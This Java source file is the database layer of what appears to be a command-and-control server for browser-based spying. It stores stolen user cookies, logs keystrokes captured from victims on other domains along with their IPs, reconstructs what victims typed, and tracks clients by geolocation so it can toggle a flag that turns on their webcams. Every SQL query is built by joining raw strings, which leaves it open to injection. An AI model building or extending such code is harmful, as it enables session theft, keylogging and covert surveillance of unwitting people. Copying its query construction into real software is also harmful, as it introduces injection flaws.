package com.eh.openshiftapp.dao;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.List;

import com.eh.openshiftapp.model.KeyloggedUser;
import com.eh.openshiftapp.model.UserCookie;
import com.eh.openshiftapp.model.Webcam;
import com.eh.openshiftapp.utility.ApplicationUtility;

public class ApplicationDao extends SqlQueries {
	final JdbcConnection jdbcConnection = new JdbcConnection();
	Connection connection = null;
	Statement statement = null;
	PreparedStatement preparedStatement = null;
	ResultSet resultSet = null;

	public void insertCookie(String username, String cookie) throws SQLException {
		final String SQL_QUERY = "insert into USER_COOKIE (USERNAME, COOKIE, COOKIE_DATE) values ('" + username + "', '"
				+ cookie + "', now())";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		preparedStatement.executeUpdate();
		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
	}

	public void deleteCookie() throws SQLException {
		final String SQL_QUERY = "truncate table USER_COOKIE";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		preparedStatement.executeUpdate();
		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
	}

	public List<UserCookie> retrieveCookie() throws SQLException {
		final String SQL_QUERY = "select * from USER_COOKIE order by COOKIE_DATE desc";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();
		List<UserCookie> cookieList = new ArrayList<UserCookie>();

		while (resultSet.next()) {
			UserCookie userCookie = new UserCookie();
			userCookie.setUsername(resultSet.getString("USERNAME"));
			userCookie.setCookie(resultSet.getString("COOKIE"));
			userCookie.setCookieDate(resultSet.getString("COOKIE_DATE"));
			cookieList.add(userCookie);
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
		return cookieList;
	}

	public void logPressedKeys(String domain, String page, String pressedKey, String clientIP, String clientTime) throws SQLException {
		final String SQL_QUERY = "insert into KEY_LOGGER (DOMAIN, PAGE, PRESSED_KEY, CLIENT_IP, CLIENT_TIME_MILLIS, CREATED_DATE) values ('"
				+ domain + "', '" + page + "', '" + pressedKey + "', '" + clientIP + "', '" + clientTime + "', now())";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		preparedStatement.executeUpdate();
		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
	}

	public List<KeyloggedUser> getKeyloggedUsers(String logDate) throws SQLException {
		final String SQL_QUERY = "select CLIENT_IP, DOMAIN, max(CLIENT_TIME_MILLIS) dt from KEY_LOGGER where CREATED_DATE like '"
				+ logDate + "%' group by CLIENT_IP, DOMAIN order by dt desc";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();
		List<KeyloggedUser> keyloggedUserList = new ArrayList<KeyloggedUser>();

		while (resultSet.next()) {
			KeyloggedUser keyloggedUser = new KeyloggedUser();
			keyloggedUser.setClientIP(resultSet.getString("CLIENT_IP"));
			keyloggedUser.setDomain(resultSet.getString("DOMAIN"));
			keyloggedUserList.add(keyloggedUser);
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
		return keyloggedUserList;
	}

	public String getKeylogs(String logDate, String clientIP, String domain) throws SQLException, ParseException {
		final String SQL_QUERY = "select * from KEY_LOGGER where CREATED_DATE like '" + logDate + "%' and CLIENT_IP = '"
				+ clientIP + "' and DOMAIN = '" + domain + "' order by CLIENT_TIME_MILLIS";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();

		String keylogs = null;
		String pressedKey = null;
		long previousTimeMillis = 0;
		long currentTimeMillis = 0;
		StringBuffer keylogsBuffer = new StringBuffer();

		while (resultSet.next()) {
			pressedKey = resultSet.getString("PRESSED_KEY");
			currentTimeMillis = resultSet.getLong("CLIENT_TIME_MILLIS");
			ApplicationUtility.appendKeylogs(pressedKey, keylogsBuffer, previousTimeMillis, currentTimeMillis);
			previousTimeMillis = currentTimeMillis;
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
		keylogs = keylogsBuffer.toString();
		keylogsBuffer.setLength(0);
		return keylogs;
	}

	public List<KeyloggedUser> getDetailedKeylogs(String logDate, String clientIP, String domain)
			throws SQLException, ParseException {
		final String SQL_QUERY = "select * from KEY_LOGGER where CREATED_DATE like '" + logDate + "%' and CLIENT_IP = '"
				+ clientIP + "' and DOMAIN = '" + domain + "' order by CLIENT_TIME_MILLIS";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();
		List<KeyloggedUser> keyloggedUserList = new ArrayList<KeyloggedUser>();

		while (resultSet.next()) {
			KeyloggedUser keyloggedUser = new KeyloggedUser();
			keyloggedUser.setPage(resultSet.getString("PAGE"));
			keyloggedUser.setPressedKey(resultSet.getString("PRESSED_KEY"));
			keyloggedUser.setCreatedDate(resultSet.getString("CREATED_DATE"));
			keyloggedUserList.add(keyloggedUser);
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
		return keyloggedUserList;
	}

	public Webcam getWebcamInstruction(String clientIP, String geoLocation) throws SQLException {
		final String SQL_QUERY = "select * from WEBCAM where CLIENT_IP = '" + clientIP + "'";
		String UPSERT_QUERY = null;

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();
		Webcam webcam = new Webcam();

		while (resultSet.next()) {
			webcam.setClientIP(resultSet.getString("CLIENT_IP"));
			webcam.setGeoLocation(resultSet.getString("GEO_LOCATION"));
			webcam.setTurnOnCam(resultSet.getString("TURN_ON_CAM"));
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);

		if (webcam.getClientIP() == null) {
			webcam.setClientIP(clientIP);
			webcam.setGeoLocation(geoLocation);
			webcam.setTurnOnCam("no");

			UPSERT_QUERY = "insert into WEBCAM (CLIENT_IP, GEO_LOCATION, TURN_ON_CAM, CREATED_DATE, MODIFIED_DATE) values ('"
					+ webcam.getClientIP() + "', '" + webcam.getGeoLocation() + "', '" + webcam.getTurnOnCam()
					+ "', now(), now())";
		} else {
			UPSERT_QUERY = "update WEBCAM set geo_location = '" + geoLocation
					+ "', modified_date = now() where client_ip = '" + clientIP + "'";
		}

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(UPSERT_QUERY);
		preparedStatement.executeUpdate();
		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);

		return webcam;
	}

	public List<Webcam> getWebcamClients() throws SQLException {
		final String SQL_QUERY = "select * from WEBCAM where (timediff(now(), MODIFIED_DATE) < '00:00:15') order by MODIFIED_DATE desc";
		//final String SQL_QUERY = "select * from WEBCAM order by modified_date desc";
		// final String SQL_QUERY = "select * from webcam where (timediff(now(),
		// modified_date) < '24:00:00') order by modified_date desc";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		resultSet = preparedStatement.executeQuery();
		List<Webcam> webcamList = new ArrayList<Webcam>();

		while (resultSet.next()) {
			Webcam webcam = new Webcam();
			webcam.setClientIP(resultSet.getString("CLIENT_IP"));
			webcam.setGeoLocation(resultSet.getString("GEO_LOCATION"));
			webcam.setTurnOnCam(resultSet.getString("TURN_ON_CAM"));
			webcamList.add(webcam);
		}

		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
		return webcamList;
	}

	public void webcamSwitch(String clientIP, String turnOnCam) throws SQLException {
		final String SQL_QUERY = "update WEBCAM set TURN_ON_CAM = '" + turnOnCam
				+ "', MODIFIED_DATE = now() where CLIENT_IP = '" + clientIP + "'";

		connection = jdbcConnection.openConnection();
		preparedStatement = connection.prepareStatement(SQL_QUERY);
		preparedStatement.executeUpdate();
		jdbcConnection.closeConnection(connection, statement, preparedStatement, resultSet);
	}
}
